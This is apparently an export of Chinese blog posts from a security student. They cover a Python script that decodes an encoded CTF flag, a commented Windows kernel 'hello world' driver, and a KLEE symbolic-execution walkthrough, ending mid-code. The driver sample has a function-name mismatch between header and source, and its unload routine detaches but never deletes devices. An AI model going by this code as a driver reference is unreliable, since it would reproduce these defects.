class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Upper</span><span class="params">(ch)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> ch&gt;=<span class="string">'A'</span> <span class="keyword">and</span> ch&lt;=<span class="string">'Z'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Lower</span><span class="params">(ch)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> ch&gt;=<span class="string">'a'</span> <span class="keyword">and</span> ch&lt;=<span class="string">'z'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span><span class="params">(s)</span>:</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> Upper(i) == <span class="literal">True</span>:</span><br><span class="line">             <span class="keyword">if</span> i&gt;=<span class="string">'A'</span> <span class="keyword">and</span> i&lt;=<span class="string">'M'</span>:</span><br><span class="line">                 flag += chr(ord(i)+<span class="number">13</span>)</span><br><span class="line">             <span class="keyword">else</span>:</span><br><span class="line">                 flag += chr(ord(i)<span class="number">-13</span>)</span><br><span class="line">        <span class="keyword">elif</span> Lower(i) == <span class="literal">True</span>:</span><br><span class="line">             <span class="keyword">if</span> i&gt;=<span class="string">'a'</span> <span class="keyword">and</span> i&lt;=<span class="string">'m'</span>:</span><br><span class="line">                 flag += chr(ord(i)+<span class="number">13</span>)</span><br><span class="line">             <span class="keyword">else</span>:</span><br><span class="line">                 flag += chr(ord(i)<span class="number">-13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">             flag += i</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span></span><br><span class="line">flag = list(rot13(flag))</span><br><span class="line">flag.reverse()</span><br><span class="line">flag = <span class="string">''</span>.join(i <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">flag = base64.b64decode(flag)</span><br><span class="line">flag = list(flag)</span><br><span class="line">strs = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag)):</span><br><span class="line">    strs += chr(ord(flag[i]) <span class="number">-1</span>)</span><br><span class="line">strs = list(strs)</span><br><span class="line">strs.reverse()</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(i <span class="keyword">for</span> i <span class="keyword">in</span> strs)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WDF-helloworld</title>
      <link href="/WDF-helloworld.html"/>
      <url>/WDF-helloworld.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>Windows WDF驱动开发简单helloworld入门</p></blockquote><h2 id="helloworld-h"><a href="#helloworld-h" class="headerlink" title="helloworld.h"></a>helloworld.h</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">预处理：用来避免头文件被重复包含</span></span><br><span class="line"><span class="comment">还可以用#pragma once 防止头文件被重复包含，保证头文件只被编译一次，可移植性差</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第一种：</span></span><br><span class="line"><span class="comment">#ifndef __SOMEFILE_H__</span></span><br><span class="line"><span class="comment">#define __SOMEFILE_H__</span></span><br><span class="line"><span class="comment">... ... // 声明、定义语句</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment">第二种：</span></span><br><span class="line"><span class="comment">#pragma once</span></span><br><span class="line"><span class="comment">... ... // 声明、定义语句</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __HELLOWORLD__ <span class="comment">//预处理</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HELLOWORLD__ <span class="comment">//预处理</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 包含驱动所需的头文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wdf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这是一个结构体的定义，用以描述驱动程序的设备拓展。它保存了我们自定义所需的一些信息，有助于更加方便的编程。</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DEVICE_EXTENSION</span> &#123;</span></span><br><span class="line">PDEVICE_OBJECT DeviceObject;</span><br><span class="line">UNICODE_STRING DeviceName;</span><br><span class="line">UNICODE_STRING SymbolicLink;</span><br><span class="line">&#125; DEVICE_EXTENSION, *PDEVICE_EXTENSION;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 相关函数的声明，这些函数的具体实现存在于定义文件中</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">IN PDRIVER_OBJECT DriverObject,</span></span></span><br><span class="line"><span class="function"><span class="params">IN PUNICODE_STRING RegPath</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">IN PDRIVER_OBJECT DriverObject</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DefaultDispath</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">IN PDEVICE_OBJECT DeviceObject,</span></span></span><br><span class="line"><span class="function"><span class="params">IN PIRP Irp</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//预处理</span></span></span><br></pre></td></tr></table></figure><h2 id="helloworld-c"><a href="#helloworld-c" class="headerlink" title="helloworld.c"></a>helloworld.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 包含指定的声明文件。为每个定义文件写一个声明文件是一个不错的选择</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"helloworld.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这些是预处理。在驱动开发中，需要指定每一个函数是分页内存还是非分页内存。</span></span><br><span class="line"><span class="comment">// INIT 标识是指定函数在驱动加载时使用，是初始化相关函数，驱动成功加载以后可以从内存卸载。</span></span><br><span class="line"><span class="comment">// PAGE 标识是指此函数在驱动运行时可以被交换到磁盘上，如果不指定，编译器默认是非分页内存。</span></span><br><span class="line"><span class="comment">// 一般情况下，我们不需要考虑这些问题，但有些特殊情况，代码是不予许被交换到磁盘上的，否则导致系统蓝屏或重启。</span></span><br><span class="line"><span class="comment">// 注：函数的声明必须在这些指定内存分配的预处理器之前，否则无法通过编译。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> alloc_text(INIT,DriverEntry)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> alloc_text(PAGE,DefaultDispatch)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> alloc_text(PAGE,DriverUnload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 是DriverEntry函数的具体实现。DriverEntry是驱动程序的入口函数。有操作系统内核的I/O管理器调用。</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">IN PDRIVER_OBJECT Driver,</span></span></span><br><span class="line"><span class="function"><span class="params">IN PUNICODE_STRING RegPath</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 函数相关变量的定义</span></span><br><span class="line"><span class="comment">// C语言中变量必须定义在函数体的开始处，否则出现编译错误。</span></span><br><span class="line"><span class="comment">// C++ 语言没有这种限制</span></span><br><span class="line">NTSTATUS status;</span><br><span class="line">PDEVICE_OBJECT deviceObject;</span><br><span class="line">PDEVICE_EXTENSION deviceExtension;</span><br><span class="line">UNICODE_STRING symbolicLink;</span><br><span class="line">UNICODE_STRING deviceName;</span><br><span class="line">ULONG i;</span><br><span class="line"></span><br><span class="line"><span class="comment">// KdPrint 和 DbgPrint是一个函数，KdPrint 是 DbgPrint的宏定义凡是，用以打印调试信息，好处在于</span></span><br><span class="line"><span class="comment">// 调试版本编译时，KdPrint会打印调试信息，</span></span><br><span class="line"><span class="comment">// 发布版本编译时，KdPrint将会被全部移除。</span></span><br><span class="line">KdPrint((<span class="string">"Enter HelloWorld DriverEntry\n"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个宏，经常被用来指定参数未被引用，可以避免不必要的警告</span></span><br><span class="line"><span class="comment">// 做到开发驱动程序不出警告是基础，因为驱动程序会导致系统出现各种各样的问题</span></span><br><span class="line">UNREFERENCED_PARAMETER(RegPath);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对一个Unicode字符串进行初始化，Windows内核大量使用Unicode字符串，其具体操作有一系列函数(Rtl系列，微软推荐的运行时函数)</span></span><br><span class="line">RtlInitUnicodeString(&amp;deviceName, <span class="string">L"\\Device\\helloworld"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 宏IRP_MJ_MAXIMUM_FUNCTION代表驱动程序最大的派遣函数指针数，这里使用默认的派遣函数初始化他们。然后紧跟着下面修改我们不打算使用默认的派遣函数指针。</span></span><br><span class="line"><span class="comment">// 类似于定义数组，初始化数组</span></span><br><span class="line"><span class="comment">// 派遣函数：又被称为回调函数。在驱动程序中这些派遣函数是我们主要工作重点</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= IRP_MJ_MAXIMUM_FUNCTION; i++)</span><br><span class="line">&#123;</span><br><span class="line">Driver-&gt;MajorFunction[i] = DefaultDispatch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数，这个派遣函数需要单独提供，如果不打算对驱动程序进行卸载，这个函数可以不用提供。</span></span><br><span class="line">Driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提供给操作系统的创建，关闭，读写的派遣函数，还有更多的派遣函数需要提供，这里为了简单明了用DefaultDispatch替换</span></span><br><span class="line">Driver-&gt;MajorFunction[IRP_MJ_CREATE] = DefaultDispatch;</span><br><span class="line">Driver-&gt;MajorFunction[IRP_MJ_CLOSE] = DefaultDispatch;</span><br><span class="line">Driver-&gt;MajorFunction[IRP_MJ_READ] = DefaultDispatch;</span><br><span class="line">Driver-&gt;MajorFunction[IRP_MJ_WRITE] = DefaultDispatch;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用IoCreateDevice函数创建一个设备对象，其名称为helloworld，其设备类型为FILE_DEVICE_UNKNOWN，是一种独占设备，在运行时，只能被一个程序所使用。</span></span><br><span class="line">status = IoCreateDevice(Driver, <span class="keyword">sizeof</span>(DEVICE_EXTENSION), &amp;deviceName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, TRUE, &amp;deviceObject);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断设备是否创建成功，并进行必要的失败处理，这对于驱动程序的健壮性起着不容忽视的作用。</span></span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设备标识。有BUFFERED_IO 和 DO_BUFFERED_IO 两种，代表两种不同的缓冲区处理方式</span></span><br><span class="line">deviceObject-&gt;Flags = DO_BUFFERED_IO;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化了一个Unicode字符串，同时也初始化了声明文件中定义过的设备拓展的结构体，设备拓展中保存了我们自定义所需的一些信息。</span></span><br><span class="line">deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension;</span><br><span class="line">deviceExtension-&gt;DeviceObject = deviceObject;</span><br><span class="line">deviceExtension-&gt;DeviceName = deviceName;</span><br><span class="line">RtlInitUnicodeString(&amp;symbolicLink, <span class="string">L"\\??\\helloworld"</span>);</span><br><span class="line">deviceExtension-&gt;SymbolicLink = symbolicLink;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用IoCreateSymbolicLink函数创建设备符号链接，这个符号链接名，主要用来与应用程序进行通信</span></span><br><span class="line">status = IoCreateSymbolicLink(&amp;symbolicLink, &amp;deviceName);</span><br><span class="line"><span class="comment">//对创建结果进行必要的失败处理，如果创建失败，就删除已创建的设备对象</span></span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">IoDeleteDevice(deviceObject);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">KdPrint((<span class="string">"End HelloWorld DriverEntry\n"</span>));</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DriverUnload函数的具体实现，功能是删除设备对象和设备符号链接，如果DriverEntry函数分配了其他资源，也要在这里释放</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(IN PDRIVER_OBJECT DriverObject)</span> </span>&#123;</span><br><span class="line">PDEVICE_OBJECT deviceObject;</span><br><span class="line">UNICODE_STRING linkName;</span><br><span class="line">KdPrint((<span class="string">"Enter HelloWorld DriverUnload\n"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 由驱动对象指针得到设备对象指针</span></span><br><span class="line">deviceObject = DriverObject-&gt;DeviceObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历所有已经穿件的设备对象和设备符号链接，并将其删除</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">NULL</span> != deviceObject)</span><br><span class="line">&#123;</span><br><span class="line">PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension;</span><br><span class="line"></span><br><span class="line">linkName = deviceExtension-&gt;SymbolicLink;</span><br><span class="line">IoDeleteSymbolicLink(&amp;linkName);</span><br><span class="line">deviceObject = deviceObject-&gt;NextDevice;</span><br><span class="line">IoDetachDevice(deviceExtension-&gt;DeviceObject);</span><br><span class="line">&#125;</span><br><span class="line">KdPrint((<span class="string">"End of HelloWorld DriverUnload"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DefaultDispatch函数的具体实现，功能是直接完成IRP(Input/Output Request Package，输入输出请求包)</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DefaultDispatch</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">IN PDEVICE_OBJECT DeviceObject,</span></span></span><br><span class="line"><span class="function"><span class="params">IN PIRP Irp</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS status;</span><br><span class="line">KdPrint((<span class="string">"Enter HelloWorld DefaultDispatch"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定参数未被引用，避免不必要的警告</span></span><br><span class="line">UNREFERENCED_PARAMETER(DeviceObject);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置IRP的状态为成功</span></span><br><span class="line">status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 因为打算直接完成IRP，所以操作信息的长度为空，这里将字节处理长度信息设置为0</span></span><br><span class="line">Irp-&gt;IoStatus.Status = status;</span><br><span class="line">Irp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用IoCompleteRequest函数直接完成IRP</span></span><br><span class="line">IoCompleteRequest(Irp, IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line">KdPrint((<span class="string">"End of HelloWorld DefaultDispatch\n"</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="驱动开发所需要的工具"><a href="#驱动开发所需要的工具" class="headerlink" title="驱动开发所需要的工具"></a>驱动开发所需要的工具</h2><blockquote><p>Windbg：和VM配合实现双机联合调试，完成双机调试功能，可以结合《软件调试》这本书对Windbg有较为深入的认识。</p></blockquote><blockquote><p>DebugView： 可以捕获程序中由TRACE(debug版本)和OutputDebugString输出的信息。</p></blockquote><blockquote><p>InstDrv：安装驱动程序的软件，也可以自己编写。</p></blockquote><blockquote><p>DriverMonitor：用于查看驱动程序中的各种打印信息，帮助我们进行相应的信息显示与具体的设计。</p></blockquote><blockquote><p>DeviceTree：设备树，查看驱动对象和设备对象。</p></blockquote><blockquote><p>PcHunter（XueTr）：较高权限的内核对象查看工具，相当于任务管理器的加强版。</p></blockquote><blockquote><p>WinObj：驱动对象和设备对象的普通查看工具</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Windows驱动开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows wdf驱动开发 </tag>
            
            <tag> WDF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KLEE-符号执行框架</title>
      <link href="/KLEE-%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6.html"/>
      <url>/KLEE-%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6.html</url>
      
        <content type="html"><![CDATA[<h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><blockquote><p>通俗的解释就是，给定程序的输出，分析程序可以通过哪些路径达到给定的输出</p></blockquote><h3 id="KLEE"><a href="#KLEE" class="headerlink" title="KLEE"></a>KLEE</h3><h4 id="安装-推荐使用Docker安装-："><a href="#安装-推荐使用Docker安装-：" class="headerlink" title="安装(推荐使用Docker安装)："></a>安装(推荐使用Docker安装)：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker pull klee/klee:2.0</span><br><span class="line"></span><br><span class="line">持久性容器:当退出容器时，容器里面的内容不会初始化</span><br><span class="line">docker run -ti --name=namestring --ulimit='stack=-1:-1' klee/klee</span><br><span class="line"></span><br><span class="line">启动容器</span><br><span class="line">docker start -ai namestring</span><br></pre></td></tr></table></figure><h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4><blockquote><p>给出的是官方实例的代码</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;klee/klee.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_sign</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (x == <span class="number">0</span>)</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">0</span>)</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a;</span><br><span class="line">  klee_make_symbolic(&amp;a, <span class="keyword">sizeof</span>(a), <span class="string">"a"</span>);</span><br><span class="line">  <span class="keyword">return</span> get_sign(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看到程序有三条路径输出</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -I ../../include/ -emit-llvm -c -g -O0 -Xclang -<span class="built_in">disable</span>-O0-optnone get_sign.c</span><br></pre></td></tr></table></figure><blockquote><p>编译生成 get_sign.bc 文件，用klee 运行一下</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klee get_sign.bc</span><br></pre></td></tr></table></figure><blockquote><p>输出如下</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">klee@2038f8489243:~/klee_src/examples/get_sign$ klee get_sign.bc </span><br><span class="line">KLEE: output directory is <span class="string">"/home/klee/klee_src/examples/get_sign/klee-out-1"</span></span><br><span class="line">KLEE: Using STP solver backend</span><br><span class="line"></span><br><span class="line">KLEE: <span class="keyword">done</span>: total instructions = 33</span><br><span class="line">KLEE: <span class="keyword">done</span>: completed paths = 3</span><br><span class="line">KLEE: <span class="keyword">done</span>: generated tests = 3</span><br></pre></td></tr></table></figure><blockquote><p>可以看到一共有33条指令,完成路径3条，产生3个测试用例</p></blockquote><blockquote><p>接下来看一下klee-last文件夹，里面存放的就是测试用例</p></blockquote><blockquote><p>输入如下命令,即可查看.ktest文件夹的内容</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ktest-tool test000001.ktest</span><br></pre></td></tr></table></figure><blockquote><p>输出如下</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ktest file : <span class="string">'test000001.ktest'</span></span><br><span class="line">args       : [<span class="string">'get_sign.bc'</span>]</span><br><span class="line">num objects: 1</span><br><span class="line">object 0: name: <span class="string">'a'</span></span><br><span class="line">object 0: size: 4</span><br><span class="line">object 0: data: b<span class="string">'\x00\x00\x00\x00'</span></span><br><span class="line">object 0: hex : 0x00000000</span><br><span class="line">object 0: int : 0</span><br><span class="line">object 0: uint: 0</span><br><span class="line">object 0: text: ....</span><br></pre></td></tr></table></figure><h3 id="明日计划"><a href="#明日计划" class="headerlink" title="明日计划"></a>明日计划</h3><p>白天：全国大学生信息安全竞赛</p><p>赛后：继续学习符号执行框架</p>]]></content>
      
      
      <categories>
          
          <category> 符号执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> klee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows驱动开发(1)</title>
      <link href="/Windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-1.html"/>
      <url>/Windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-1.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>学习的内容是基于WDF框架的Windows驱动开发</p></blockquote><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ol><li>NT -&gt; WDM -&gt; WDF<blockquote><p>每个框架都是由其上一个框架发展而来的，主要原因是因为其上一个框架不易理解难于开发</p></blockquote></li><li>WDF简介<blockquote><p>WDF全称Windows驱动框架(Windows Driver Frameworks)<br>WDF两种级别的驱动程序</p><blockquote><p>用户级(UMDF–(User-Mode Driver Framework))</p><blockquote><p>是以 .dll 结尾的文件</p></blockquote><p>内核级(KMDF–(Kernel-Mode Driver Framework))</p><blockquote><p>是以 .sys 结尾的文件<br>可与其硬件直接会话，通常会通过HAL(硬件抽象层)访问硬件<br>所有的事物由对象表示，如Driver、Device等</p><blockquote><p>每个对象都有属性、方法、事件(有面向对象编程基础的都应该知道)<br>各种事件处理由事件回调函数处理<br>必须包含 DriverEntry 函数，像C语言中的 main 函数</p></blockquote></blockquote></blockquote></blockquote><h2 id="附上基本的DriverEntry例子"><a href="#附上基本的DriverEntry例子" class="headerlink" title="附上基本的DriverEntry例子"></a>附上基本的DriverEntry例子</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 